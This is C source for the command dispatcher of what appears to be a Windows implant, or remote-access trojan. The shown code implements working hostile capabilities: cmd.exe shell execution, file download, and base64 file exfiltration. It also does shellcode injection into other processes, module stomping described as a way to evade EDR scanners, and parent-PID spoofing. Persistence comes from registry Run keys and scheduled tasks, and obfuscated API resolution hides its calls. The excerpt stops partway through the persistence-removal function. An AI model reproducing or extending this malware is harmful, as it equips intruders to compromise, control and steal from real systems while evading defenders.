/*
 * commands.c — command dispatcher.
 *
 * Supported commands:
 *   shell    — execute via cmd.exe /C, capture stdout+stderr
 *   dl       — download file from URL to disk (WinHTTP)
 *   ul       — upload file contents in result output
 *   inject   — classic shellcode injection (NtOpenProcess + NT*VM + NtCreateThread)
 *   stomp    — module stomping injection (overwrite mapped DLL .text with shellcode)
 *   ps       — list running processes (Toolhelp32)
 *   cd       — change working directory
 *   sleep    — update beacon interval
 *   kill     — self-terminate
 *   ppid       — set parent PID spoof (stored; applied on next CreateProcess)
 *   getpid     — return own PID
 *   whoami     — return hostname\username + admin status
 *   token        — impersonate: steal <pid>, make_token <user/pass>, revert
 *   timestomp    — overwrite file timestamps from ISO-8601 string or reference file
 *   screenshot   — capture primary display as base64 BMP
 *   portfwd_open — connect TCP socket to host:port, store session by id
 *   portfwd_send — send b64 data over session socket, return received b64
 *   portfwd_close— close session socket
 *   lateral      — remote exec via SCM service creation or wmic
 */
#include "../include/implant.h"
#include "../include/obfstr.h"
#include <string.h>

/* PPID spoof: stored globally, applied in _CreateProcessWithPPID */
static DWORD s_ppid = 0;

/* ── Helpers ─────────────────────────────────────────────────────────────── */

static AgentResult *MakeResult(const AgentCommand *cmd,
                                int success, int exitCode, char *output) {
    AgentResult *r = (AgentResult *)ImplantAlloc(sizeof(AgentResult));
    if (!r) return NULL;
    xsnprintf(r->cmd_id, CMD_ID_LEN, "%s", cmd->id);
    r->success   = success;
    r->exit_code = exitCode;
    r->output    = output;
    return r;
}

static AgentResult *ErrorResult(const AgentCommand *cmd, const char *msg) {
    return MakeResult(cmd, 0, -1, ImplantStrDup(msg));
}

void FreeResult(AgentResult *r) {
    if (!r) return;
    if (r->output) {
        SecureZero(r->output, strlen(r->output));
        ImplantFree(r->output);
    }
    SecureZero(r, sizeof(*r));
    ImplantFree(r);
}

/* ── PPID-spoofed CreateProcess ──────────────────────────────────────────── */

typedef BOOL (WINAPI *pfnInitializeProcThreadAttributeList)
    (LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
typedef BOOL (WINAPI *pfnUpdateProcThreadAttribute)
    (LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
typedef VOID (WINAPI *pfnDeleteProcThreadAttributeList)
    (LPPROC_THREAD_ATTRIBUTE_LIST);

static BOOL _CreateProcessWithPPID(const char *cmd,
                                    HANDLE *hProcOut, HANDLE *hThreadOut,
                                    HANDLE hStdOut, HANDLE hStdErr) {
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.StartupInfo.cb      = sizeof(si);
    si.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
    si.StartupInfo.hStdInput  = NULL;
    si.StartupInfo.hStdOutput = hStdOut;
    si.StartupInfo.hStdError  = hStdErr;

    BOOL usePPID = (s_ppid != 0);
    SIZE_T attrSize = 0;

    pfnInitializeProcThreadAttributeList pInit = NULL;
    pfnUpdateProcThreadAttribute          pUpd  = NULL;
    pfnDeleteProcThreadAttributeList      pDel  = NULL;

    if (usePPID) {
        pInit = (pfnInitializeProcThreadAttributeList)(FARPROC)
            g_GetProcAddress(g_GetModuleHandleA(OBFSTR("kernel32.dll")),
                           OBFSTR("InitializeProcThreadAttributeList"));
        pUpd  = (pfnUpdateProcThreadAttribute)(FARPROC)
            g_GetProcAddress(g_GetModuleHandleA(OBFSTR("kernel32.dll")),
                           OBFSTR("UpdateProcThreadAttribute"));
        pDel  = (pfnDeleteProcThreadAttributeList)(FARPROC)
            g_GetProcAddress(g_GetModuleHandleA(OBFSTR("kernel32.dll")),
                           OBFSTR("DeleteProcThreadAttributeList"));

        if (pInit && pUpd && pDel) {
            pInit(NULL, 0, 1, &attrSize);
            si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)ImplantAlloc(attrSize);
            if (si.lpAttributeList) {
                pInit(si.lpAttributeList, 0, 1, &attrSize);
                HANDLE hParent = NULL;
                NtOpenProc(s_ppid, PROCESS_CREATE_PROCESS, &hParent);
                if (hParent) {
                    pUpd(si.lpAttributeList, 0,
                         0x00020000 /* PROC_THREAD_ATTRIBUTE_PARENT_PROCESS */,
                         &hParent, sizeof(HANDLE), NULL, NULL);
                }
            }
        } else {
            usePPID = FALSE;
        }
    }

    WCHAR wcmd[CMD_OUTPUT_MAX / 4];
    StrToWstr(cmd, wcmd, CMD_OUTPUT_MAX / 4);

    DWORD flags = CREATE_NO_WINDOW;
    if (usePPID && si.lpAttributeList) flags |= EXTENDED_STARTUPINFO_PRESENT;

    BOOL ok = CreateProcessW(NULL, wcmd, NULL, NULL, TRUE,
                              flags, NULL, NULL,
                              (LPSTARTUPINFOW)&si, &pi);
    if (usePPID && si.lpAttributeList) {
        if (pDel) pDel(si.lpAttributeList);
        ImplantFree(si.lpAttributeList);
    }

    if (ok) {
        if (hProcOut)   *hProcOut   = pi.hProcess;
        if (hThreadOut) *hThreadOut = pi.hThread;
    }
    return ok;
}

/* ── shell ───────────────────────────────────────────────────────────────── */

static AgentResult *CmdShell(const AgentCommand *cmd) {
    char *cmdStr = JsonGetStr(cmd->args_json, "cmd");
    if (!cmdStr || !cmdStr[0]) {
        ImplantFree(cmdStr);
        return ErrorResult(cmd, "missing cmd argument");
    }

    /* Build: cmd.exe /C <cmdStr> */
    char full[4096];
    xsnprintf(full, sizeof(full), "cmd.exe /C %s", cmdStr);
    ImplantFree(cmdStr);

    /* Pipe for stdout+stderr */
    HANDLE hReadPipe = NULL, hWritePipe = NULL;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
        return ErrorResult(cmd, "CreatePipe failed");

    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    HANDLE hProc = NULL, hThread = NULL;
    BOOL ok = _CreateProcessWithPPID(full, &hProc, &hThread, hWritePipe, hWritePipe);
    CloseHandle(hWritePipe);

    if (!ok) {
        CloseHandle(hReadPipe);
        return ErrorResult(cmd, "CreateProcess failed");
    }
    CloseHandle(hThread);

    /* Read output */
    char *out = (char *)ImplantAlloc(CMD_OUTPUT_MAX);
    DWORD totalRead = 0, read = 0;
    if (out) {
        while (ReadFile(hReadPipe, out + totalRead,
                         CMD_OUTPUT_MAX - totalRead - 1, &read, NULL) && read > 0) {
            totalRead += read;
            if (totalRead >= CMD_OUTPUT_MAX - 1) break;
        }
        out[totalRead] = '\0';
    }
    CloseHandle(hReadPipe);

    DWORD exitCode = 0;
    WaitForSingleObject(hProc, 30000);
    GetExitCodeProcess(hProc, &exitCode);
    CloseHandle(hProc);

    return MakeResult(cmd, exitCode == 0 ? 1 : 0, (int)exitCode, out);
}

/* ── ps (process list) ───────────────────────────────────────────────────── */

static AgentResult *CmdPS(const AgentCommand *cmd) {
    typedef HANDLE (WINAPI *pfnCreateToolhelp32Snapshot)(DWORD, DWORD);
    typedef BOOL   (WINAPI *pfnProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
    typedef BOOL   (WINAPI *pfnProcess32NextW)(HANDLE, LPPROCESSENTRY32W);

    HMODULE k32 = g_GetModuleHandleA(OBFSTR("kernel32.dll"));
    pfnCreateToolhelp32Snapshot pSnap =
        (pfnCreateToolhelp32Snapshot)(FARPROC)g_GetProcAddress(k32, OBFSTR("CreateToolhelp32Snapshot"));
    pfnProcess32FirstW pFirst =
        (pfnProcess32FirstW)(FARPROC)g_GetProcAddress(k32, OBFSTR("Process32FirstW"));
    pfnProcess32NextW pNext =
        (pfnProcess32NextW)(FARPROC)g_GetProcAddress(k32, OBFSTR("Process32NextW"));

    if (!pSnap || !pFirst || !pNext)
        return ErrorResult(cmd, "Toolhelp32 unavailable");

    HANDLE snap = pSnap(0x00000002 /* TH32CS_SNAPPROCESS */, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return ErrorResult(cmd, "CreateToolhelp32Snapshot failed");

    char *out = (char *)ImplantAlloc(CMD_OUTPUT_MAX);
    if (!out) { CloseHandle(snap); return ErrorResult(cmd, "alloc failed"); }

    int pos = 0;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    if (pFirst(snap, &pe)) {
        do {
            char name[256] = {0};
            WstrToStr(pe.szExeFile, name, sizeof(name));
            pos += xsnprintf(out + pos, CMD_OUTPUT_MAX - pos,
                             "%5lu  %s\n", (unsigned long)pe.th32ProcessID, name);
        } while (pNext(snap, &pe));
    }
    CloseHandle(snap);
    out[pos] = '\0';
    return MakeResult(cmd, 1, 0, out);
}

/* ── cd ──────────────────────────────────────────────────────────────────── */

static AgentResult *CmdCD(const AgentCommand *cmd) {
    char *path = JsonGetStr(cmd->args_json, "path");
    if (!path) return ErrorResult(cmd, "missing path");

    WCHAR wpath[PATH_MAX_C];
    StrToWstr(path, wpath, PATH_MAX_C);
    ImplantFree(path);

    BOOL ok = SetCurrentDirectoryW(wpath);
    if (!ok) return ErrorResult(cmd, "SetCurrentDirectory failed");

    WCHAR cwd[PATH_MAX_C] = {0};
    GetCurrentDirectoryW(PATH_MAX_C, cwd);
    char cwdA[PATH_MAX_C] = {0};
    WstrToStr(cwd, cwdA, PATH_MAX_C);
    return MakeResult(cmd, 1, 0, ImplantStrDup(cwdA));
}

/* ── sleep ───────────────────────────────────────────────────────────────── */

static AgentResult *CmdSleep(const AgentCommand *cmd) {
    char *s = JsonGetStr(cmd->args_json, "interval");
    char *j = JsonGetStr(cmd->args_json, "jitter");

    if (s) {
        int secs = 0;
        for (const char *p = s; *p >= '0' && *p <= '9'; p++)
            secs = secs * 10 + (*p - '0');
        g_agent.base_interval = secs;
        ImplantFree(s);
    }
    if (j) {
        int pct = 0;
        for (const char *p = j; *p >= '0' && *p <= '9'; p++)
            pct = pct * 10 + (*p - '0');
        g_agent.jitter_pct = pct;
        ImplantFree(j);
    }
    return MakeResult(cmd, 1, 0, ImplantStrDup("ok"));
}

/* ── kill ────────────────────────────────────────────────────────────────── */

static AgentResult *CmdKill(const AgentCommand *cmd) {
    (void)cmd;
    ExitProcess(0);
    return NULL;
}

/* ── ppid ────────────────────────────────────────────────────────────────── */

static AgentResult *CmdPPID(const AgentCommand *cmd) {
    char *p = JsonGetStr(cmd->args_json, "pid");
    if (!p) return ErrorResult(cmd, "missing pid");
    DWORD pid = 0;
    for (const char *c = p; *c >= '0' && *c <= '9'; c++) pid = pid * 10 + (*c - '0');
    s_ppid = pid;
    ImplantFree(p);
    return MakeResult(cmd, 1, 0, ImplantStrDup("ok"));
}

/* ── getpid ──────────────────────────────────────────────────────────────── */

static AgentResult *CmdGetPID(const AgentCommand *cmd) {
    char buf[32];
    xsnprintf(buf, sizeof(buf), "%lu", (unsigned long)GetCurrentProcessId());
    return MakeResult(cmd, 1, 0, ImplantStrDup(buf));
}

/* ── whoami ──────────────────────────────────────────────────────────────── */

static AgentResult *CmdWhoami(const AgentCommand *cmd) {
    char buf[512];
    xsnprintf(buf, sizeof(buf), "%s\\%s (admin=%s)",
              g_agent.hostname, g_agent.username,
              g_agent.is_admin ? "yes" : "no");
    return MakeResult(cmd, 1, 0, ImplantStrDup(buf));
}

/* ── inject ──────────────────────────────────────────────────────────────── */

static AgentResult *CmdInject(const AgentCommand *cmd) {
    char *pidStr  = JsonGetStr(cmd->args_json, "pid");
    char *scB64   = JsonGetStr(cmd->args_json, "shellcode");
    if (!pidStr || !scB64) {
        ImplantFree(pidStr); ImplantFree(scB64);
        return ErrorResult(cmd, "missing pid or shellcode");
    }

    DWORD pid = 0;
    for (const char *p = pidStr; *p >= '0' && *p <= '9'; p++) pid = pid * 10 + (*p - '0');
    ImplantFree(pidStr);

    /* Decode base64 shellcode */
    int scB64Len = (int)strlen(scB64);
    BYTE *sc = (BYTE *)ImplantAlloc(scB64Len);
    if (!sc) { ImplantFree(scB64); return ErrorResult(cmd, "alloc failed"); }
    int scLen = Base64Decode(scB64, scB64Len, sc, scB64Len);
    ImplantFree(scB64);
    if (scLen <= 0) { ImplantFree(sc); return ErrorResult(cmd, "base64 decode failed"); }

    HANDLE hProc = NULL;
    NTSTATUS st = NtOpenProc(pid, PROCESS_ALL_ACCESS, &hProc);
    if (st != 0 || !hProc) {
        ImplantFree(sc);
        return ErrorResult(cmd, "NtOpenProcess failed");
    }

    PVOID remote = NULL;
    st = NtAlloc(hProc, &remote, (SIZE_T)scLen, PAGE_READWRITE);
    if (st != 0) { ImplantFree(sc); CloseHandle(hProc); return ErrorResult(cmd, "NtAlloc failed"); }

    st = NtWrite(hProc, remote, sc, (SIZE_T)scLen);
    ImplantFree(sc);
    if (st != 0) { NtFree(hProc, remote); CloseHandle(hProc); return ErrorResult(cmd, "NtWrite failed"); }

    ULONG old = 0;
    st = NtProtect(hProc, remote, (SIZE_T)scLen, PAGE_EXECUTE_READ, &old);
    if (st != 0) { NtFree(hProc, remote); CloseHandle(hProc); return ErrorResult(cmd, "NtProtect failed"); }

    HANDLE hThread = NULL;
    st = NtCreateThread(hProc, remote, NULL, &hThread);
    if (hThread) CloseHandle(hThread);
    CloseHandle(hProc);

    if (st != 0) return ErrorResult(cmd, "NtCreateThread failed");
    return MakeResult(cmd, 1, 0, ImplantStrDup("injected"));
}

/* ── ul (upload file → exfil its contents) ──────────────────────────────── */

static AgentResult *CmdUpload(const AgentCommand *cmd) {
    char *path = JsonGetStr(cmd->args_json, "path");
    if (!path) return ErrorResult(cmd, "missing path");

    WCHAR wpath[PATH_MAX_C];
    StrToWstr(path, wpath, PATH_MAX_C);
    ImplantFree(path);

    HANDLE hFile = CreateFileW(wpath, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return ErrorResult(cmd, "file open failed");

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize > (4 * 1024 * 1024)) {
        CloseHandle(hFile);
        return ErrorResult(cmd, "file too large or invalid");
    }

    BYTE *raw = (BYTE *)ImplantAlloc(fileSize);
    if (!raw) { CloseHandle(hFile); return ErrorResult(cmd, "alloc failed"); }

    DWORD read = 0;
    ReadFile(hFile, raw, fileSize, &read, NULL);
    CloseHandle(hFile);

    /* base64-encode file content as output */
    int b64cap = (fileSize * 4 / 3) + 8;
    char *b64 = (char *)ImplantAlloc(b64cap);
    if (!b64) { ImplantFree(raw); return ErrorResult(cmd, "alloc failed"); }
    Base64Encode(raw, (int)read, b64, b64cap);
    ImplantFree(raw);
    return MakeResult(cmd, 1, 0, b64);
}

/* ── dl (download URL to disk) ───────────────────────────────────────────── */

static AgentResult *CmdDownload(const AgentCommand *cmd) {
    char *url  = JsonGetStr(cmd->args_json, "url");
    char *dest = JsonGetStr(cmd->args_json, "dest");
    if (!url || !dest) {
        ImplantFree(url); ImplantFree(dest);
        return ErrorResult(cmd, "missing url or dest");
    }

    DWORD len = 0;
    char *data = HttpPost_GET(url, &len);
    ImplantFree(url);
    if (!data) { ImplantFree(dest); return ErrorResult(cmd, "download failed"); }

    WCHAR wdest[PATH_MAX_C];
    StrToWstr(dest, wdest, PATH_MAX_C);
    ImplantFree(dest);

    HANDLE hFile = CreateFileW(wdest, GENERIC_WRITE, 0, NULL,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        ImplantFree(data);
        return ErrorResult(cmd, "file create failed");
    }

    DWORD written = 0;
    WriteFile(hFile, data, len, &written, NULL);
    CloseHandle(hFile);
    ImplantFree(data);

    char out[64];
    xsnprintf(out, sizeof(out), "wrote %lu bytes", (unsigned long)written);
    return MakeResult(cmd, 1, 0, ImplantStrDup(out));
}

/*
 * HttpPost_GET — reuse WinHTTP stack for a plain GET request.
 * Declared here; beacon.c owns the session logic but we replicate a minimal
 * GET path to avoid coupling files.
 */
char *HttpPost_GET(const char *url, DWORD *outLen) {
    *outLen = 0;
    if (!pWinHttpOpen) return NULL;

    WCHAR wHost[256] = {0}, wPath[512] = {0};
    INTERNET_PORT port = 80;
    BOOL https = FALSE;

    /* reuse same ParseURL — it's static in beacon.c; duplicate inline here */
    const char *p = url;
    if (strncmp(p, "https://", 8) == 0) { https = TRUE; p += 8; port = 443; }
    else if (strncmp(p, "http://", 7) == 0) { p += 7; port = 80; }

    const char *slash = p;
    while (*slash && *slash != '/' && *slash != ':') slash++;
    char hostbuf[256] = {0};
    int hlen = (int)(slash - p); if (hlen > 255) hlen = 255;
    memcpy(hostbuf, p, hlen);
    StrToWstr(hostbuf, wHost, 256);
    if (*slash == ':') { slash++; port = 0; while (*slash>='0'&&*slash<='9'){port=port*10+(*slash-'0');slash++;} }
    if (*slash == '/') StrToWstr(slash, wPath, 512); else StrToWstr("/", wPath, 512);

    HINTERNET hSess = pWinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                    WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) return NULL;

    HINTERNET hConn = pWinHttpConnect(hSess, wHost, port, 0);
    if (!hConn) { pWinHttpCloseHandle(hSess); return NULL; }

    DWORD flags = https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = pWinHttpOpenRequest(hConn, L"GET", wPath, NULL,
                                          WINHTTP_NO_REFERER,
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hReq) { pWinHttpCloseHandle(hConn); pWinHttpCloseHandle(hSess); return NULL; }

    char *result = NULL;
    if (pWinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                             WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        pWinHttpReceiveResponse(hReq, NULL)) {
        DWORD cap = 65536, avail = 0, read = 0, total = 0;
        result = (char *)ImplantAlloc(cap);
        if (result) {
            while (pWinHttpQueryDataAvailable(hReq, &avail) && avail > 0) {
                if (total + avail + 1 > cap) {
                    cap = total + avail + 4096;
                    char *tmp = (char *)ImplantAlloc(cap);
                    if (!tmp) { ImplantFree(result); result = NULL; break; }
                    memcpy(tmp, result, total);
                    ImplantFree(result); result = tmp;
                }
                if (!pWinHttpReadData(hReq, result + total, avail, &read)) break;
                total += read;
            }
            if (result) { result[total] = '\0'; *outLen = total; }
        }
    }

    pWinHttpCloseHandle(hReq);
    pWinHttpCloseHandle(hConn);
    pWinHttpCloseHandle(hSess);
    return result;
}

/* ── stomp (module stomping injection) ───────────────────────────────────────
 *
 * Instead of allocating private RWX memory (a classic EDR IOC), we:
 *   1. Load a sacrificial DLL (e.g. xpsservices.dll) into the target process
 *      via a LoadLibrary remote-thread trick
 *   2. Parse the loaded DLL's PE header to find its .text section
 *   3. NtProtect .text → RW, NtWrite our shellcode over it, NtProtect → RX
 *   4. NtCreateThread at the start of the stomped region
 *
 * Result: shellcode executes from a region that belongs to a mapped, signed
 * DLL — no private RWX allocation visible to scanners.
 *
 * Args JSON: { "pid": N, "shellcode": "<b64>", "dll": "<optional dll name>" }
 */
static AgentResult *CmdStomp(const AgentCommand *cmd) {
    char *pidStr = JsonGetStr(cmd->args_json, "pid");
    char *scB64  = JsonGetStr(cmd->args_json, "shellcode");
    char *dllName = JsonGetStr(cmd->args_json, "dll");   /* optional */
    if (!pidStr || !scB64) {
        ImplantFree(pidStr); ImplantFree(scB64); ImplantFree(dllName);
        return ErrorResult(cmd, "missing pid or shellcode");
    }

    DWORD pid = 0;
    for (const char *p = pidStr; *p >= '0' && *p <= '9'; p++) pid = pid * 10 + (*p - '0');
    ImplantFree(pidStr);

    /* Default sacrificial DLL — small, always present on Win10+, rarely loaded */
    const char *sacDLL = (dllName && dllName[0]) ? dllName : OBFSTR("xpsservices.dll");

    /* Decode shellcode */
    int scB64Len = (int)strlen(scB64);
    BYTE *sc = (BYTE*)ImplantAlloc(scB64Len);
    if (!sc) { ImplantFree(scB64); ImplantFree(dllName); return ErrorResult(cmd, "alloc"); }
    int scLen = Base64Decode(scB64, scB64Len, sc, scB64Len);
    ImplantFree(scB64); ImplantFree(dllName);
    if (scLen <= 0) { ImplantFree(sc); return ErrorResult(cmd, "b64 decode"); }

    HANDLE hProc = NULL;
    NTSTATUS st = NtOpenProc(pid, PROCESS_ALL_ACCESS, &hProc);
    if (st != 0 || !hProc) { ImplantFree(sc); return ErrorResult(cmd, "NtOpenProcess"); }

    /* --- Step 1: load sacrificial DLL into target via LoadLibraryA remote thread --- */
    /* Allocate space for DLL path string in target */
    PVOID pathRemote = NULL;
    SIZE_T pathLen = strlen(sacDLL) + 1;
    st = NtAlloc(hProc, &pathRemote, pathLen, PAGE_READWRITE);
    if (st != 0) { CloseHandle(hProc); ImplantFree(sc); return ErrorResult(cmd, "NtAlloc path"); }
    NtWrite(hProc, pathRemote, (PVOID)sacDLL, pathLen);

    /* Get LoadLibraryA address (same in all processes — ASLR is per-boot, not per-process) */
    PVOID pLoadLib = (PVOID)g_GetProcAddress(g_GetModuleHandleA(OBFSTR("kernel32.dll")), OBFSTR("LoadLibraryA"));
    HANDLE hLLThread = NULL;
    NtCreateThread(hProc, pLoadLib, pathRemote, &hLLThread);
    if (hLLThread) {
        WaitForSingleObject(hLLThread, 5000);
        CloseHandle(hLLThread);
    }
    NtFree(hProc, pathRemote);

    /* --- Step 2: find the loaded DLL's base address in the target via PEB --- */
    /* Use NtQueryInformationProcess(ProcessBasicInformation) to get PEB, then
     * read InLoadOrderModuleList from target PEB.  Simplified: we use
     * EnumProcessModules on the target to find the module. */
    typedef BOOL (WINAPI *pfnEnumProcMods)(HANDLE, HMODULE*, DWORD, LPDWORD);
    typedef BOOL (WINAPI *pfnGetModFileNameExA)(HANDLE, HMODULE, LPSTR, DWORD);
    HMODULE psapi = g_LoadLibraryA(OBFSTR("psapi.dll"));
    PVOID stompBase = NULL;
    DWORD stompTextSize = 0;
    DWORD stompTextRVA  = 0;

    if (psapi) {
        pfnEnumProcMods pEnum = (pfnEnumProcMods)(FARPROC)g_GetProcAddress(psapi, OBFSTR("EnumProcessModules"));
        pfnGetModFileNameExA pName = (pfnGetModFileNameExA)(FARPROC)g_GetProcAddress(psapi, OBFSTR("GetModuleFileNameExA"));

        if (pEnum && pName) {
            HMODULE mods[512]; DWORD needed = 0;
            if (pEnum(hProc, mods, sizeof(mods), &needed)) {
                int nMods = (int)(needed / sizeof(HMODULE));
                char modName[256];
                /* Convert sacDLL to lowercase for comparison */
                char sacLower[128]; int si=0;
                while (sacDLL[si] && si<127) {
                    sacLower[si] = (sacDLL[si]>='A'&&sacDLL[si]<='Z') ? sacDLL[si]+32 : sacDLL[si];
                    si++;
                }
                sacLower[si] = '\0';

                for (int i = 0; i < nMods; i++) {
                    if (!pName(hProc, mods[i], modName, sizeof(modName))) continue;
                    /* Check if basename matches */
                    char *base2 = modName + strlen(modName);
                    while (base2 > modName && base2[-1] != '\\' && base2[-1] != '/') base2--;
                    /* lowercase compare */
                    char baseLow[128]; int bi=0;
                    while (base2[bi] && bi<127) {
                        baseLow[bi] = (base2[bi]>='A'&&base2[bi]<='Z') ? base2[bi]+32 : base2[bi];
                        bi++;
                    }
                    baseLow[bi]='\0';
                    if (strcmp(baseLow, sacLower) != 0) continue;

                    /* Read the PE header from target to find .text section */
                    BYTE hdrBuf[4096]; DWORD nRead = 0;
                    if (!ReadProcessMemory(hProc, mods[i], hdrBuf, sizeof(hdrBuf), (SIZE_T*)&nRead))
                        break;
                    PIMAGE_NT_HEADERS ntH = (PIMAGE_NT_HEADERS)(hdrBuf + ((PIMAGE_DOS_HEADER)hdrBuf)->e_lfanew);
                    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntH);
                    for (WORD s2 = 0; s2 < ntH->FileHeader.NumberOfSections; s2++) {
                        if (memcmp(sec[s2].Name, ".text", 5) == 0) {
                            stompBase      = (BYTE*)mods[i] + sec[s2].VirtualAddress;
                            stompTextRVA   = sec[s2].VirtualAddress;
                            stompTextSize  = sec[s2].Misc.VirtualSize;
                            break;
                        }
                    }
                    break;
                }
            }
        }
    }

    if (!stompBase) {
        CloseHandle(hProc);
        ImplantFree(sc);
        return ErrorResult(cmd, "could not locate DLL .text in target");
    }

    if ((DWORD)scLen > stompTextSize) {
        CloseHandle(hProc);
        ImplantFree(sc);
        return ErrorResult(cmd, "shellcode larger than DLL .text section");
    }

    /* --- Step 3: NtProtect RW, write shellcode, NtProtect RX, create thread --- */
    ULONG oldProt = 0;
    st = NtProtect(hProc, stompBase, (SIZE_T)scLen, PAGE_READWRITE, &oldProt);
    if (st != 0) { CloseHandle(hProc); ImplantFree(sc); return ErrorResult(cmd, "NtProtect RW"); }

    NtWrite(hProc, stompBase, sc, (SIZE_T)scLen);
    ImplantFree(sc);

    NtProtect(hProc, stompBase, (SIZE_T)scLen, PAGE_EXECUTE_READ, &oldProt);

    HANDLE hSCThread = NULL;
    st = NtCreateThread(hProc, stompBase, NULL, &hSCThread);
    if (hSCThread) CloseHandle(hSCThread);
    CloseHandle(hProc);

    if (st != 0) return ErrorResult(cmd, "NtCreateThread failed");
    return MakeResult(cmd, 1, 0, ImplantStrDup("stomped"));
}

/* ── persist ─────────────────────────────────────────────────────────────────
 *
 * Two methods:
 *   "reg"     — HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 *               Requires: advapi32!RegOpenKeyExA + RegSetValueExA
 *   "schtask" — schtasks.exe /Create  (shell child process)
 *
 * Args JSON: { "method": "reg"|"schtask", "name": "<key/task name>",
 *              "path": "<optional exe path; defaults to own image>" }
 */
static AgentResult *CmdPersist(const AgentCommand *cmd) {
    char *method = JsonGetStr(cmd->args_json, "method");
    char *name   = JsonGetStr(cmd->args_json, "name");
    char *path   = JsonGetStr(cmd->args_json, "path");

    if (!method || !name || !name[0]) {
        ImplantFree(method); ImplantFree(name); ImplantFree(path);
        return ErrorResult(cmd, "missing method or name");
    }

    /* Resolve own executable path if not provided */
    char exePath[PATH_MAX_C] = {0};
    if (path && path[0]) {
        xsnprintf(exePath, sizeof(exePath), "%s", path);
    } else {
        WCHAR wExe[PATH_MAX_C] = {0};
        GetModuleFileNameW(NULL, wExe, PATH_MAX_C);
        WstrToStr(wExe, exePath, PATH_MAX_C);
    }
    ImplantFree(path);

    AgentResult *result = NULL;

    if (strcmp(method, "reg") == 0) {
        /* Registry Run key — dynamic advapi32 resolution (no static IAT) */
        typedef LONG (WINAPI *pfnRegOpenKeyExA_t)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
        typedef LONG (WINAPI *pfnRegSetValueExA_t)(HKEY, LPCSTR, DWORD, DWORD,
                                                    const BYTE *, DWORD);
        typedef LONG (WINAPI *pfnRegCloseKey_t)(HKEY);

        HMODULE adv = g_LoadLibraryA(OBFSTR("advapi32.dll"));
        if (!adv) {
            result = ErrorResult(cmd, "advapi32 unavailable");
            goto done;
        }

        pfnRegOpenKeyExA_t  pOpen  = (pfnRegOpenKeyExA_t)(FARPROC)
            g_GetProcAddress(adv, OBFSTR("RegOpenKeyExA"));
        pfnRegSetValueExA_t pSet   = (pfnRegSetValueExA_t)(FARPROC)
            g_GetProcAddress(adv, OBFSTR("RegSetValueExA"));
        pfnRegCloseKey_t    pClose = (pfnRegCloseKey_t)(FARPROC)
            g_GetProcAddress(adv, OBFSTR("RegCloseKey"));

        if (!pOpen || !pSet || !pClose) {
            result = ErrorResult(cmd, "reg API unavailable");
            goto done;
        }

        HKEY hKey = NULL;
        LONG rc = pOpen((HKEY)0x80000001 /* HKCU */,
                        OBFSTR("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                        0, 0x0002 /* KEY_SET_VALUE */, &hKey);
        if (rc != 0 || !hKey) {
            result = ErrorResult(cmd, "RegOpenKeyEx failed");
            goto done;
        }

        rc = pSet(hKey, name, 0, 1 /* REG_SZ */,
                  (const BYTE *)exePath, (DWORD)(strlen(exePath) + 1));
        pClose(hKey);

        result = (rc == 0) ? MakeResult(cmd, 1, 0, ImplantStrDup("reg persist set"))
                           : ErrorResult(cmd, "RegSetValueEx failed");

    } else if (strcmp(method, "schtask") == 0) {
        /* Scheduled task via schtasks.exe */
        char taskCmd[PATH_MAX_C * 2];
        xsnprintf(taskCmd, sizeof(taskCmd),
                  "schtasks /Create /F /SC ONLOGON /TN \"%s\" /TR \"%s\"",
                  name, exePath);

        char full[PATH_MAX_C * 2 + 16];
        xsnprintf(full, sizeof(full), "cmd.exe /C %s", taskCmd);

        HANDLE hProc = NULL, hThr = NULL;
        BOOL ok = _CreateProcessWithPPID(full, &hProc, &hThr, NULL, NULL);
        if (ok) {
            WaitForSingleObject(hProc, 10000);
            DWORD ec = 1;
            GetExitCodeProcess(hProc, &ec);
            CloseHandle(hThr);
            CloseHandle(hProc);
            result = (ec == 0) ? MakeResult(cmd, 1, 0, ImplantStrDup("schtask persist set"))
                               : ErrorResult(cmd, "schtasks returned error");
        } else {
            result = ErrorResult(cmd, "CreateProcess failed");
        }

    } else {
        result = ErrorResult(cmd, "unknown method (use reg or schtask)");
    }

done:
    ImplantFree(method);
    ImplantFree(name);
    return result;
}

/* ── remove_persist ──────────────────────────────────────────────────────── */

static AgentResult *CmdRemovePersist(const AgentCommand *cmd) {
    char *method = JsonGetStr(cmd->args_json, "method");
    char *name   = JsonGetStr(cmd->args_json, "name");

    if (!method || !name || !name[0]) {
        ImplantFree(method); ImplantFree(name);
        return ErrorResult(cmd, "missing method or name");
    }

    AgentResult *result = NULL;

    if (strcmp(method, "reg") == 0) {
        typedef LONG (WINAPI *pfnRegOpenKeyExA_t)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
